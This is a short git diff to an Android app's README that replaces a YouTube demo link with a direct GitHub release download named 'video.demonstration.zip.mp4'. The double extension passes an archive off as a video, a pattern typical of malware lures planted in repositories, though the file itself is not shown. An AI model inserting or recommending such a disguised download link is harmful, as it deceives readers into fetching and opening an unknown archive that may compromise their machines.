@@ -21,7 +21,7 @@ A Kotlin and Jetpack Compose application implementing the mocked-up screens as a
 
 ### 🎥 Video Demonstration
 Watch the live demonstration of the Android application here: 
-👉 **[YouTube Demo](https://youtu.be/xhbJAvW5luY)**
+👉 **https://github.com/Mzantsi-eats/Mzantsi_Eats_APP/releases/download/v1.0.1/video.demonstration.zip.mp4**
 
 ---
 
